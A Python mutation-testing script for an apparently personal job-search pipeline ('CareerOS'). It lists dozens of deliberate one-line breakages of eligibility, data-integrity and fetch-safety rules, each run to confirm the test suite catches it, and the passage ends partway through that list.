"""Mutation check for safety-critical rules (pattern from GrowthOS run-plugin-tests.py --mutations).

Each mutation deliberately breaks one control in a scratch copy of the engine; the test suite must fail.
A mutation that survives means a control is untested. Writes a receipt keyed by source-file SHA-256.

Each result is read from unittest's own summary (2026-10-17). CAUGHT means a real test failed or errored with the whole
suite loaded. LOAD_ERROR (a test module failed to import, or fewer tests ran than in the baseline), TIMEOUT (one mutated
suite ran longer than MUTATION_TIMEOUT), INFRA_ERROR (the copy or the run itself broke) and ANCHOR_NOT_FOUND are never
counted as caught. The receipt records the baseline's health, the environment, and for each defect the tests that
caught it.

A stopped or slept-through run resumes (2026-10-23): run the same command again on the same tree, in the same
environment, and the defects already CAUGHT carry over. SLEPT (the machine slept through every attempt),
TREE_CHANGED (the folder changed during the run) and ENV_CHANGED (Python, its packages or Node.js changed during the run;
both stop it) are never counted as caught either. --fresh starts from zero; creating the STOP_FILE in the temp folder
stops a run so that it can resume.

    .venv\\Scripts\\python.exe tools\\mutate.py [--workers 4] [--fresh]
"""
from __future__ import annotations

import ast
import contextlib
import fnmatch
import hashlib
import json
import os
import re
import shutil
import subprocess
import sys
import tempfile
import threading
import time
from collections.abc import Callable, Iterator
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime, timezone
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
MUTATIONS = [
    ("careeros/qualify/gate.py", 'result.fail("state_not_eligible"', 'result.flag("state_not_eligible"', "remote-state rule disabled"),
    ("careeros/qualify/gate.py", 'result.fail("clearance_required"', 'result.flag("clearance_required"', "clearance rule disabled"),
    ("careeros/qualify/gate.py", 'if result.hard_failures:\n        result.decision = "rejected"', 'if False:\n        result.decision = "rejected"', "hard failures ignored"),
    ("careeros/qualify/gate.py", "if floor and top is not None and top < floor:", "if False:", "pay floor ignored"),
    ("careeros/qualify/gate.py", 'if len(hits) >= 2 or any(t in STRONG_SCAM_TERMS for t in hits):', "if False:", "scam block disabled"),
    ("careeros/extract/rules.py", '    return "hard_required"\n\n\ndef _confidence', '    return "preferred"\n\n\ndef _confidence', "ambiguous requirements downgraded to preferred"),
    ("careeros/db/store.py", 'raise DataQualityError("projection_history_mismatch")', "pass", "projection mismatch not fail-closed"),
    ("careeros/db/store.py", "raise IdempotencyCollision(key)", 'return "replay"', "idempotency collision ignored"),
    ("careeros/db/store.py", 'raise PermissionDenied(f"{self.component}_cannot_write:{table}")', "pass", "separation of duties disabled"),
    ("careeros/core/transitions.py", 'raise TransitionRejected("reason_required")', "pass", "reason requirement dropped"),
    ("careeros/pipeline.py", '("same_requisition", other["job_id"], True) if same_place', '("same_requisition", other["job_id"], False) if same_place', "requisition dedupe disabled"),
    ("careeros/normalize/posting.py", 'pairs = sorted(p for p in parts.query.split("&") if p and not _TRACKING.match(p.split("=", 1)[0]))', "pairs = []", "job-identifying URL parameters dropped"),
    ("careeros/pipeline.py", "if full_board and employer:", "if False:", "delisted jobs never closed"),
    ("careeros/review/report.py", 'return html.escape("" if value is None else str(value), quote=True)', 'return "" if value is None else str(value)', "report escaping disabled"),
    ("careeros/review/server.py", "hmac.compare_digest(supplied, token)", "True", "review token check disabled"),
    ("careeros/review/labels.py", "WHERE j.exclude_from_kpi = 0 AND l.profile = 'primary'", "WHERE 1 = 1 AND l.profile = 'primary'", "test rows counted in metrics"),
    ("careeros/qualify/gate.py", 'result.fail("not_remote"', 'result.flag("not_remote"', "remote-only rule disabled"),
    ("careeros/qualify/scores.py", "credit = EVIDENCE_WEIGHT.get(evidence, 0.4) if evidence else 0.0", "credit = 1.0 if evidence else 0.0",
     "training-only skills counted as full matches"),
    ("careeros/extract/ai.py", " or _squash(quote) not in posting:", ":", "AI records accepted without a verbatim quote"),
    ("careeros/extract/ai.py", 'if r.requirement_type == "preferred" and (r.category, r.name) in rules_hard:', "if False:",
     "AI may downgrade required to preferred"),
    ("careeros/extract/ai.py", "if r.category in GATE_CRITICAL and", "if False and", "gate-critical rules records dropped"),
    ("careeros/pipeline.py", "if ctx.ai is None or _ai_calls_today(ctx.store) >= cap:", "if ctx.ai is None:", "AI daily cap ignored"),
    ("careeros/pipeline.py", '    family = classify_family(job["title_norm"], ctx.policy.get("families", default={}))\n    if family:\n        return family',
     '    family = job["family"]\n    if family:\n        return family', "stale job family used after policy change"),
    ("careeros/qualify/gate.py", 'result.fail("seniority_gap"', 'result.flag("seniority_gap"', "seniority gate disabled"),
    ("careeros/qualify/profile.py", 'value = item.get("screening_years", item.get("years"))', 'value = item.get("years")',
     "user's screening years ignored"),
    ("careeros/normalize/posting.py", "if _NEGATION.search(text[max(0, cue.start() - 50): cue.end()]):", "if False:",
     "state exclusion list read as the allowed list"),
    ("careeros/normalize/posting.py", 'title = _IC_MANAGER.sub(" ", title_norm)', "title = title_norm",
     "product/project managers treated as people managers"),
    ("careeros/qualify/gate.py", 'result.fail("state_excluded"', 'result.flag("state_excluded"', "excluded-state rule disabled"),
    ("careeros/pipeline.py", 'counts["refreshed"] = refresh_derived_fields(ctx)', 'counts["refreshed"] = 0',
     "stale stored fields never refreshed"),
    ("careeros/pipeline.py", '{"policy": fingerprint(decisive), "gate": gate_mod.RULES_VERSION, "scores": score_mod.SCORES_VERSION,',
     '{"policy": fingerprint(decisive), "gate": None, "scores": None,', "rule-code changes not re-evaluated"),
    ("careeros/pipeline.py", 'if k not in NOT_PRIMARY_DECISIONS}', 'if True}', "operational settings re-evaluate every job"),
    ("careeros/pipeline.py", 'NOT_PRIMARY_DECISIONS = ("operations", "night", "scanning",',
     'NOT_PRIMARY_DECISIONS = ("operations", "scanning",', "NIGHT settings re-evaluate every PRIMARY job"),
    ("careeros/pipeline.py", '                        "night": fingerprint(ctx.policy.data.get("night") or {}),\n', "",
     "NIGHT settings changes never re-check NIGHT jobs"),
    # application tracker, review server, alert emails, Gmail, backups (2026-10-11)
    # re-anchored 2026-10-17: R2 made the right-to-represent conflict a hold that needs your explanation
    ("careeros/review/applications.py", '            check.add("right_to_represent_conflict", "hold",',
     '            check.add("right_to_represent_conflict", "warn",', "second-channel (right to represent) check disabled"),
    ("careeros/review/applications.py", 'OR duplicate_of IN ({marks}) OR repost_of IN ({marks})", tuple(frontier) * 4)',
     'OR duplicate_of IN ({marks})", tuple(frontier) * 3)', "reposts of a role you applied to not linked"),
    ("careeros/review/applications.py", 'if app["channel"] == channel and', 'if False and app["channel"] == channel and',
     "duplicate application not detected"),
    ("careeros/db/store.py", '("applications", "tracker"): {"notes"}', '("applications", "tracker"): {"notes", "channel"}',
     "tracker may rewrite how you applied"),
    ("careeros/review/server.py", "if form_keys.get(key) != (action, target):", "if key not in form_keys:",
     "form key not bound to its action and target"),
    ("careeros/cli.py", "board_url = link.url if parsed else greenhouse_candidate(link.url)",
     "board_url = link.url", "alert links on non-board sites fetched"),
    ("careeros/discovery/gmail.py", 'if not hmac.compare_digest(received.get("state", ""), state):', "if False:",
     "Gmail sign-in state not checked"),
    ("careeros/discovery/gmail.py", "if SCOPE not in granted:", "if False:", "Gmail scope not checked"),
    ("careeros/cli.py", 'if ctx.store.one("SELECT 1 FROM inbox_issues WHERE repo = ? AND number = ?", (repo, issue["number"])):',
     "if False:", "GitHub inbox issues re-read every run"),
    ("careeros/cli.py", '            inbox.close_with_reply(repo, issue["number"], reply, runner)\n',
     "            pass\n", "GitHub inbox issues never answered or closed"),
    ("careeros/cli.py", "        if known:  # a job CareerOS already tracks", "        if False:  # a job CareerOS already tracks",
     "recommended jobs CareerOS already tracks fetched again as new"),
    ("careeros/cli.py",
     "    posting = fetch_single(client, ats, token, external_id)  # first: a link that does not resolve adds no employer\n"
     "    employer = _employer_row(ctx.store, ats, token)\n"
     "    if employer is None:  # self-growing employer list, named after the company when the link came with one\n"
     "        from careeros.discovery.saved import parent_for\n"
     "        employer = _add_employer(ctx, employer_name or token, ats, token,\n"
     "                                 parent=parent_for(employer_name, ctx.policy) if employer_name else None)\n",
     "    employer = _employer_row(ctx.store, ats, token)\n"
     "    if employer is None:\n"
     "        employer = _add_employer(ctx, employer_name or token, ats, token)\n"
     "    posting = fetch_single(client, ats, token, external_id)\n",
     "unresolvable links leave employers behind"),
    ("careeros/discovery/github_inbox.py", "if not repo or not REPO.match(repo):", "if not repo:",
     "GitHub inbox repository name not validated"),
    # prompts v2.2, PRIMARY (2026-10-12)
    ("careeros/review/applications.py", 'source = "chatgpt_gmail_alert" if is_alert_source(lead["context"]) else "chatgpt_inbox"',
     'source = "chatgpt_inbox"', "ChatGPT Gmail-alert finds not tracked as their own source"),
    ("careeros/cli.py", 'if args.command == "run":  # the scheduled run has no window', 'if False:  # the scheduled run has no window',
     "a failed daily run stays silent"),
    ("careeros/qualify/gate.py", 'return "CONDITIONAL" if codes & material else "ELIGIBLE"', 'return "ELIGIBLE"',
     "material unknowns never make a job CONDITIONAL"),
    ("careeros/qualify/gate.py", 'if "held_d13" in codes:\n        return "HOLD"', 'if False:\n        return "HOLD"',
     "D13 hold not reflected in the state"),
    ("careeros/qualify/scores.py", 'strong = state == "ELIGIBLE" and skill_coverage >= tiers.get("skill_coverage_min", 0.0)',
     "strong = True", "Tier A/B ignore the state and skill minimum"),
    ("careeros/qualify/scores.py", 'strong = state == "ELIGIBLE" and skill_coverage >= tiers.get("skill_coverage_min", 0.0)',
     'strong = state == "ELIGIBLE"', "Tier A/B ignore the 70% skill minimum"),
    ("careeros/qualify/scores.py", 'dims["domain_relevance"] = _dim(domain["value"]', 'dims["domain_relevance"] = _dim(0.5',
     "domain relevance not counted in Career Value"),
    ("careeros/qualify/scores.py", '    for name in ("direct", "payer", "healthcare"):\n        level = levels.get(name) or {}\n        hits',
     '    for name in ("healthcare", "payer", "direct"):\n        level = levels.get(name) or {}\n        hits',
     "domain takes the weakest matching level"),
    ("careeros/qualify/gate.py", "        if comp_trusted(job):\n", "        if True:\n", "aggregator pay estimates reject jobs"),
    ("careeros/qualify/gate.py", '    if generic == "no_context":\n        result.fail("generic_title_no_context"',
     '    if False:\n        result.fail("generic_title_no_context"', "generic titles qualify on the title alone"),
    ("careeros/qualify/gate.py", "if len(text) < 200:  # too little text", "if not text:  # too little text",
     "stub postings rejected as generic titles"),
    ("careeros/qualify/gate.py", "profile=_education_summary(profile),", "profile=None,", "rejections lose their profile evidence"),
    ("careeros/discovery/sources.py", 'or statuses().get(key, "manual")',
     'or statuses().get(key, "allowed")', "unlisted sources treated as allowed"),
    ("careeros/cli.py", 'if board_url and sources.status(parse_job_url(board_url)[0]) != "allowed":', "if False:",
     "links on non-allowed sources fetched"),
    ("careeros/cli.py", "            known = _ledger_match(ctx, link, title_norm)\n", "            known = None\n",
     "same job through another site not recognised"),
    ("careeros/cli.py", "if not known and _ledger_lead(ctx, link, title_norm):", "if False:",
     "duplicate leads across sites kept"),
    ("careeros/review/funnel.py", '"responded": {"responded",', '"responded": {"acknowledged", "responded",',
     "automatic confirmations counted as responses"),
    ("careeros/review/applications.py", '"context_json": json.dumps(application_context(store, job_id))', '"context_json": None',
     "applications lose their source context"),
    # prompts v2.1 policy (2026-10-12)
    ("careeros/qualify/gate.py", "        elif req.years is not None and req.category in YEARS_CATEGORIES:\n            have = line_best.get(years_line)",
     "        elif req.years is not None and req.category in YEARS_CATEGORIES:\n            have = profile.years_for(req.name)",
     "an OR-list of years judged as separate demands"),
    ("careeros/normalize/posting.py", 'return "non_US" if found_non_us and not found_us else None', "return None",
     "country named in the title ignored"),
    ("careeros/pipeline.py", 'if title_country(row["title"]) == "non_US" and row["country"] != "non_US":', "if False:",
     "stored jobs keep a wrong country"),
    ("careeros/qualify/gate.py", 'if excluded_employer(job, policy):\n        result.fail("employer_excluded"',
     'if False:\n        result.fail("employer_excluded"', "excluded employers pass the gate"),
    ("careeros/cli.py", "if any(contains_term(norm(f\"{link.text} {link.context} {link.url}\"), b) for b in blocked):", "if False:",
     "leads from excluded employers kept"),
    ("careeros/qualify/gate.py", "if gap > major_gap and hard:", "if False:", "required years far beyond yours never reject"),
    ("careeros/qualify/gate.py", "if have is not None and req.years > have:  # preferred years",
     "if have is not None and req.years > have and hard:  # preferred years", "preferred years gap ignored"),
    ("careeros/qualify/night.py", 'if schedule == "daytime":', "if False:", "NIGHT accepts daytime schedules"),
    ("careeros/qualify/night.py", "if _MANAGER.search(title_norm):", "if False:", "NIGHT accepts manager roles"),
    ("careeros/qualify/night.py", 'result.fail("below_night_pay_floor"', 'result.flag("below_night_pay_floor"', "NIGHT pay floor ignored"),
    # prompts v2.2, NIGHT modes (2026-10-12)
    ("careeros/qualify/night.py", "        if _NEGATION.search(clause) or (policy is not None and _incidental(clause, after, policy)):\n",
     "        if policy is not None and _incidental(clause, after, policy):\n", "negated schedule phrases counted"),
    ("careeros/qualify/night.py", "        if _NEGATION.search(clause) or (policy is not None and _incidental(clause, after, policy)):\n",
     "        if _NEGATION.search(clause):\n", "incidental after-hours work read as night work"),
    ("careeros/qualify/night.py", "            if title_lowered and _stated(title_lowered, term):\n",
     "            if False:\n", "night words in the job title ignored"),
    ("careeros/qualify/night.py", '    if hours and hours[0] in ("overnight", "evening"):\n        return hours\n', "",
     "stated night hours ignored"),
    ("careeros/qualify/night.py", "    return bool(_INDIRECT_HOURS.search(clause))", "    return False",
     "business or training hours reject NIGHT jobs as daytime"),
    ("careeros/qualify/night.py", "    if start in (20, 21, 22, 23, 0, 1, 2) and 4 <= end <= 10:", "    if False:",
     "overnight time ranges not recognised"),

    ("careeros/qualify/night.py", "clause = _CLAUSE_END.split(text[max(0, m.start() - 80):m.start()])[-1]",
     "clause = text[max(0, m.start() - 80):m.start()]", "a negation reaches across sentences"),
    ("careeros/qualify/night.py", 'return "replacement" if schedule == "overnight" and full else "supplemental"',
     'return "supplemental"', "every NIGHT job treated as Supplemental"),
    ("careeros/qualify/night.py", '    if mode == "supplemental":\n        load = workload(',
     '    if False:\n        load = workload(', "no conflict-of-interest or workload review for Supplemental"),
    ("careeros/qualify/night.py", '    if mode == "supplemental":\n        load = workload(',
     '    if True:\n        load = workload(', "conflict-of-interest review applied to Replacement too"),
    ("careeros/qualify/night.py", '    material |= set(settings(policy).get("material_unknowns_extra") or [])\n', "",
     "unknown NIGHT hours not CONDITIONAL"),
    ("careeros/qualify/night.py", 'eligible = state == "ELIGIBLE"', "eligible = True", "CONDITIONAL NIGHT jobs reach Tier A/B"),
    ("careeros/qualify/night.py", 'weights = mode_cfg.get("weights") or {}',
     'weights = ((cfg.get("modes") or {}).get("supplemental") or {}).get("weights") or {}', "NIGHT modes share one set of weights"),
    ("careeros/review/labels.py",
     "WHERE j.exclude_from_kpi = 0 AND l.profile = 'primary'\n                          AND l.label_id = (SELECT label_id FROM labels WHERE job_id = l.job_id AND profile = 'primary'",
     "WHERE j.exclude_from_kpi = 0\n                          AND l.label_id = (SELECT label_id FROM labels WHERE job_id = l.job_id",
     "NIGHT labels counted toward PRIMARY acceptance"),
    ("careeros/review/report.py", 'return _form("label_night", job_id', 'return _form("label", job_id', "NIGHT cards label as PRIMARY"),
    ("careeros/qualify/night.py", 'elif schedule == "unknown":', 'elif False:', "unknown NIGHT schedule not flagged"),
    ("careeros/pipeline.py", "    if not night.enabled(ctx.policy):\n        return counts\n", "",
     "NIGHT runs while switched off"),
    ("careeros/pipeline.py", "            if latest.get(job[\"job_id\"]) == fp:\n                continue\n", "",
     "NIGHT re-assesses every job every run"),
    ("careeros/cli.py", 'if profile == "night" and not night.enabled(ctx.policy):', "if False:",
     "NIGHT issues graded with PRIMARY rules while NIGHT is off"),
    ("careeros/review/report.py", "f\"AND t.sequence = j.state_sequence WHERE j.current_state = 'rejected' AND NOT {NIGHT_ONLY} \"",
     "f\"AND t.sequence = j.state_sequence WHERE j.current_state = 'rejected' \"", "NIGHT-only jobs shown in PRIMARY rejections"),
    ("careeros/discovery/imap.py", "_quote(mailbox), readonly=True)", "_quote(mailbox), readonly=False)",
     "IMAP mailbox opened writable"),
    ("careeros/discovery/imap.py", '"(BODY.PEEK[])"', '"(BODY[])"', "IMAP fetch marks emails as read"),
    ("careeros/discovery/imap.py", 'self.conn.uid("SEARCH", "X-GM-RAW", _quote(query))', 'self.conn.uid("SEARCH", "ALL")',
     "IMAP reads every email instead of the alert search"),
    ("careeros/ops/backup.py", "if not (FOLDER.match(folder.name) and (folder / MANIFEST).is_file()):", "if False:",
     "backup pruning may delete folders it did not create"),
    ("careeros/review/report.py", "waiting >= NO_RESPONSE_DAYS", "waiting >= 0", "follow-up nudge shown immediately"),
    ("careeros/normalize/posting.py", "    if stated:\n        return stated\n", "", "title employment marker ignored"),
    ("careeros/pipeline.py", 'stated = title_employment(row["title"])', "stated = None", "stored employment types never corrected"),
    # Phase 1 audit, prompts v2.5 (2026-10-12)
    ("careeros/qualify/gate.py", "    if leading or len(strategy) >= 2:", "    if False:", "Principal strategic/leadership scope never rejected"),
    ("careeros/qualify/gate.py", "    if leading or len(strategy) >= 2:", "    if True:", "every Principal title rejected"),
    ("config/policy/defaults.yaml", "title_exclude: [director, vice president, vp, svp, evp, avp, chief,",
     "title_exclude: [director, vice president, chief,", "VP abbreviations not rejected"),
    ("careeros/qualify/scores.py", "        weight = float(weights.get(level, 1))", "        weight = 1.0",
     "skill coverage is a naive count, not weighted"),
    ("careeros/qualify/scores.py", "        credit = EVIDENCE_WEIGHT.get(evidence, 0.4) if evidence else 0.0", "        credit = 1.0",
     "skill coverage ignores whether evidence was found"),
    ("careeros/qualify/scores.py", "            if any(contains_term(title, norm(w)) for w in aliases.get(name, [name])):", "            if False:",
     "a skill named in the job title is not promoted to core"),
    ("careeros/qualify/scores.py", 'if r.requirement_type in REQUIRED_TYPES and r.category in ("skill", "domain"):',
     'if r.requirement_type in REQUIRED_TYPES and r.category not in ("experience", "years_experience"):',
     "education, authorization, clearance or licences counted as skills"),
    # re-anchored 2026-10-17: R5 moved the overlap rejection and the workload levels to dated intervals (worktime.py)
    ("careeros/qualify/night.py", '        if confirmed_overlap:\n            result.fail("overlaps_day_job"',
     '        if False:\n            result.fail("overlaps_day_job"', "Supplemental hours overlapping the day job accepted"),
    ("careeros/qualify/worktime.py", '    elif result["combined_hours"] > limits["caution_total_hours"] or (sleep and min(sleep) < limits["caution_min_rest_hours"]):',
     "    elif False:", "workload caution never raised"),
    ("careeros/qualify/night.py", '            result.flag("night_industry_overlap"', '            result.flag("night_coi_review"',
     "same-industry overlap alone makes a NIGHT job CONDITIONAL"),
    ("careeros/discovery/note.py", 'if "@" not in value and _VALID[key].fullmatch(value) and key not in fields:',
     "if key not in fields:", "Note values not validated"),
    ("careeros/discovery/seen_index.py", "if k.lower() in ID_PARAMS)", "if True)", "tracking parameters kept in the seen index"),
    ("careeros/discovery/seen_index.py", 'link(("title", o["company"], o["title"]), i, guard=True)',
     'link(("title", o["company"], o["title"]), i)', "different requisitions merged under one title"),
    ("careeros/discovery/seen_index.py", '        if o["req"] and o["company"]:\n            link(("req", o["company"], o["req"]), i)\n', "",
     "the same requisition on different sites not merged"),
    ("careeros/discovery/seen_index.py", "    if _EMAIL.search(text):", "    if False:", "an email address can reach the seen index"),
    ("careeros/discovery/github_inbox.py", "            if sha and base64.b64decode(current.get(\"content\") or \"\").decode(\"utf-8\") == content:\n                continue\n",
     "", "an unchanged index is committed again"),
    ("careeros/discovery/seen_index.py", '"next_run_lookback_days": 7 if recovering else 3', '"next_run_lookback_days": 3',
     "a Gmail outage never widens the next lookback"),
    ("careeros/discovery/github_inbox.py", "        return \"ok\" if word in (\"ok\", \"available\") else", "        return \"ok\" if True else",
     "a reported Gmail outage read as ok"),
    ("careeros/cli.py", '        if link.site == "invalid":', "        if False:", "a malformed inbox line stored as a lead"),
    ("careeros/cli.py", '        if req and row["requisition_id"] and norm_req(row["requisition_id"]) != req:\n            continue\n', "",
     "a different requisition under the same title treated as already tracked"),
    ("careeros/review/funnel.py", '        if app["outcome"]:', "        if False:", "negative outcomes not counted"),
    ("careeros/review/funnel.py", '    for job in top_of_funnel(store):', "    for job in []:", "recommended / approved stages missing"),
    # Source discovery and opportunity upgrades (2026-10-12)
    ("careeros/discovery/board_discovery.py", '    verified = bool(kinds & {"supplied_board_link", "official_domain"}) or {"board_name", "description_name"} <= kinds',
     "    verified = True", "a guessed board is trusted without identity evidence"),
    ("careeros/discovery/http.py", "            self.budget.take(PROVIDER_HOSTS.get(host))", "            pass", "requests not counted against the budget"),
    ("careeros/discovery/http.py", "        if self.allowed_hosts is not None and host not in self.allowed_hosts:", "        if False:",
     "redirects to other hosts allowed"),
    ("careeros/discovery/http.py", "                if delay is not None and delay > MAX_RETRY_AFTER:", "                if False:",
     "a long Retry-After is slept through"),
    ("careeros/discovery/board_discovery.py", '    if candidate.relationship == "staffing_agency":', "    if False:",
     "a staffing agency's client is guessed"),
    ("careeros/discovery/board_discovery.py", "    manual = manual_system(candidate.board_url or \"\")\n    if manual:",
     "    manual = manual_system(candidate.board_url or \"\")\n    if False:", "excluded systems treated as boards to probe"),
    ("careeros/discovery/board_verifier.py", '    if discovery_cfg(ctx.policy)["auto_activate"] or m["override_reason"]:', "    if True:",
     "verified boards join the daily scan without approval"),
    ("careeros/discovery/board_discovery.py", '        if len(hits) == 1:\n            return {"decision": "matched", "method": "requisition"',
     '        if False:\n            return {"decision": "matched", "method": "requisition"', "requisition ids ignored when matching leads"),
    ("careeros/pipeline.py", "                    if missed >= needed:", "                    if True:", "one missed scan closes a posting"),
    ("careeros/cli.py", 'result = ingest(ctx, dict(r), postings, full_board=outcome == "complete")',
     "result = ingest(ctx, dict(r), postings, full_board=True)", "a suspicious scan closes postings"),
    ("careeros/cli.py", '        elif code == "access_restricted" and health.restricted_streak(store, r["employer_id"]) >= int(',
     '        elif code == "access_restricted" and 1 >= int(', "one restricted scan disables a board"),
    ("careeros/pipeline.py", '    if decision["outcome"] == "rescued" and ctx.rescue_budget <= 0:', "    if False:",
     "title rescues not capped per run"),
    ("careeros/qualify/title_rescue.py", "        hits = _hits(text, terms)\n        if hits:", "        hits = []\n        if hits:",
     "software QA / clinical / call monitoring titles rescued"),
    ("careeros/pipeline.py", '    if ctx.policy.get("location", "remote_only") and job["remote_type"] in ("onsite", "hybrid"):\n        return False\n', "",
     "rescues spent on jobs the remote rule rejects anyway"),
    ("careeros/qualify/title_rescue.py", '    context = _hits(_role_text(job, policy), cfg.get("context_terms"))',
     '    context = _hits(text, cfg.get("context_terms"))', "a company blurb rescues unrelated roles"),
    ("careeros/pipeline.py", '    family = _current_family(ctx, job)\n    if family != job["family"]:',
     '    family = _current_family(ctx, job)\n    if False:', "a stale rescued family survives a rule change"),
    ("careeros/pipeline.py", '                        "rescue": RESCUE_VERSION})', '                        "rescue": None})',
     "a rescue rule change re-checks nothing"),
    ("careeros/pipeline.py", "        if _rescuable(ctx, job):  # the same test as the review itself",
     '        if title_rescue.prefilter(job["title_norm"], ctx.policy):  # the same test as the review itself',
     "skipped rescues bounce between rejected and normalized every run"),
    ("careeros/qualify/facts.py", '    if low < floor:\n        return _fact("pay", "unknown"', '    if False:\n        return _fact("pay", "unknown"',
     "a range that straddles the minimum treated as compatible"),
    ("careeros/qualify/facts.py", "    if geo and lowest < floor:", "    if False:", "geographic pay tiers ignored"),
    ("careeros/qualify/facts.py", "    if variable and not _BASE.search(near):", "    if False:", "bonus / commission counted as base pay"),
    ("careeros/pipeline.py", '                elif existing["current_state"] == "closed" and full_board:', "                elif False:",
     "a reappearing closed posting stays closed"),
    ("careeros/pipeline.py", 'counts["changed" if changes else "edited_cosmetic"] += 1', 'counts["changed"] += 1',
     "cosmetic edits counted as meaningful changes"),
    ("careeros/pipeline.py", '        if fields.get("requisition_id") and other["requisition_id"] and fields["requisition_id"] != other["requisition_id"]:',
     "        if False:", "identical titles with different requisitions merged as variants"),
    ("careeros/discovery/manual_intake.py", "    existing = _already(store, parsed)", "    existing = None",
     "a pasted posting is not deduplicated"),
    ("careeros/discovery/discovery_queue.py", "            if curated and parent is not None:", "            if False:",
     "curated suggestions can overspend their share"),
    ("careeros/review/shortlist.py", '        years = item.get("years")  # the FACT, never screening_years',
     '        years = item.get("screening_years", item.get("years"))', "drafts use screening-only years"),
    ("careeros/review/shortlist.py", '    if not label or label["label"] not in ("apply", "stretch"):', "    if False:",
     "drafts made for jobs you did not choose to pursue"),
    ("careeros/review/shortlist.py", "                          AND NOT EXISTS (SELECT 1 FROM dismissals d WHERE d.job_id = j.job_id)\n", "",
     "dismissed jobs stay on the shortlist"),
    ("careeros/discovery/source_health.py", '    if not _cfg(policy)["adaptive"]:\n        return True, level, why\n', "",
     "adaptive cadence applied while switched off"),
    # 2026-10-13 board verification: the employer's own site first, the ATS second
    ("careeros/discovery/board_verifier.py", '(handshake, "no official-site handshake")', '(True, "no official-site handshake")',
     "a board admitted without the official-site handshake"),
    ("careeros/discovery/board_verifier.py", '(domain_named, "official domain does not name the employer")',
     '(True, "official domain does not name the employer")', "an unconfirmed official domain accepted"),
    ("careeros/discovery/board_verifier.py", "    if trust < auto_trust:", "    if trust < auto_trust - 20:", "Board Trust threshold lowered"),
    ("careeros/discovery/board_verifier.py", '        return "mismatch", [f"board names another company: {board_name}"]',
     '        return "unresolved", []', "a board naming another company is not a mismatch"),
    ("careeros/discovery/board_verifier.py", '        if status == "active" or (legacy and status in reg.LEGACY_GRACE_STATUSES):',
     "        if True:", "new boards skip quarantine"),
    ("careeros/discovery/board_verifier.py", "    if problems:\n        return _validation_failed", "    if False:\n        return _validation_failed",
     "a failed validation scan still promotes the board"),
    ("careeros/discovery/board_verifier.py", '            reg.update_board(store, mid, {"verification_status": "rejected", "verification_failure": "official_site_contradicts",',
     '            reg.update_board(store, mid, {"verification_status": "review_required", "verification_failure": "official_site_contradicts",',
     "a board the employer's site contradicts is not rejected"),
    ("careeros/discovery/board_verifier.py", '    _retire(ctx, claim, f"the employer moved to {new_key}", migrated_to=new["mapping_id"] if new else None)\n', "",
     "an ATS migration leaves the old board active"),
    ("careeros/discovery/board_registry.py", '    if m["paused_reason"]:\n        return False, f"paused: {m[\'paused_reason\']}"',
     '    if False:\n        return False, ""', "a paused board is still scanned"),
    ("careeros/discovery/board_registry.py", '    if m["provenance"] == "legacy_unknown" and m["verification_status"] in LEGACY_GRACE_STATUSES:',
     '    if m["verification_status"] in LEGACY_GRACE_STATUSES:', "any unverified board gets the legacy grace"),
    ("careeros/discovery/board_registry.py", '            legacy = row["admitted_via"] == "legacy"', "            legacy = True",
     "boards added after the migration treated as legacy"),
    ("careeros/discovery/board_registry.py", '    if m["identity_check"] == "mismatch" or (m["verification_failure"] or "") in HARD_FAILURES:',
     '    if m["identity_check"] == "mismatch":', "a manual approval bypasses a security failure"),
    ("careeros/discovery/board_registry.py", "WHERE override_expires_at IS NOT NULL AND override_expires_at <= ?",
     "WHERE override_expires_at IS NOT NULL AND override_expires_at <= '0'", "manual approvals never expire"),
    ("careeros/discovery/board_registry.py", '    compatible = [r for r in rows if not domain or not r["official_domain"] or r["official_domain"] == domain]',
     "    compatible = rows", "companies with the same name but different websites merged"),
    ("careeros/discovery/board_registry.py", '        return "no posting names the employer or its website any more"', "        return None",
     "a board taken over by another company keeps being ingested"),
    ("careeros/discovery/board_registry.py", "        update_board(store, m[\"mapping_id\"], {\"identity_signals\": json.dumps({**baseline, **shares})})",
     "        pass", "the identity baseline never learns from fuller scans"),
    ("careeros/discovery/safe_fetch.py", "        if not public:\n", "        if False:\n", "private network addresses fetched"),
    ("careeros/discovery/safe_fetch.py", '        raise SiteFetchError("unsafe_url", "IP address host", url)', "        pass",
     "IP-address hosts fetched"),
    ("careeros/discovery/safe_fetch.py", '    if parts.scheme != "https":', '    if parts.scheme not in ("https", "http"):',
     "plain http fetched"),
    ("careeros/discovery/safe_fetch.py", "            if not self.in_scope(host):", "            if False:",
     "redirects off the employer's domain followed"),
    ("careeros/discovery/safe_fetch.py", "        return self._robots[host].can_fetch(ROBOTS_AGENT, url)", "        return True",
     "robots.txt ignored"),
    ("careeros/discovery/safe_fetch.py", "MAX_BYTES = 1_500_000", "MAX_BYTES = 15_000_000", "oversized pages read"),
    ("careeros/discovery/safe_fetch.py", "                    if ctype and not ctype.startswith(accept):", "                    if False:",
     "non-HTML content read"),
    ("careeros/discovery/safe_fetch.py", "        if self.pin:  # connect", "        if False:  # connect",
     "connections not pinned to the checked address (DNS rebinding)"),
    ("careeros/discovery/site_inspect.py", '_TOKEN = re.compile(r"^[A-Za-z0-9][A-Za-z0-9._-]{0,99}$")', '_TOKEN = re.compile(r".+")',
     "malformed board tokens accepted"),
    ("careeros/discovery/source_health.py", "    return {p for p, n in failures.items()", "    return set() or {p for p, n in {}.items()",
     "a provider outage is blamed on every employer"),
    ("careeros/cli.py", "            if not admitted:  # not verified", "            if False:  # not verified",
     "unverified boards scanned"),
    ("careeros/cli.py", '        if code == "not_found" and m is not None:', "        if False:", "a vanished board keeps its place in the scan"),
    ("careeros/cli.py", "        if outage:\n            continue\n", "", "employers penalised for a provider outage"),
    ("careeros/cli.py", "allowed_hosts=set(PROVIDER_HOSTS))\n    now = ctx.store.clock.now()", ")\n    now = ctx.store.clock.now()",
     "board scans follow redirects anywhere"),
    ("careeros/normalize/posting.py", '    return "US_unspecified" if country == "US" else "unknown"', '    return "US_nationwide"',
     "'Remote' read as nationwide"),
    ("careeros/discovery/board_verifier.py", '    if (systems or findings) and kind == "reverify" and legacy_or_live and not proven_before:',
     "    if False:", "an unproven legacy board retired on a guess"),
    ("careeros/discovery/board_verifier.py", '    return (claim is not None and claim["provenance"] == "legacy_unknown"',
     '    return False and (claim is not None and claim["provenance"] == "legacy_unknown"',
     "every inconclusive legacy check becomes a review case"),
    # 2026-10-13 job lifecycle hardening (Prompt 4)
    ("careeros/pipeline.py", "                        WHERE j.current_state IN ('scored','rejected','eligible','needs_review')\"\"\")",
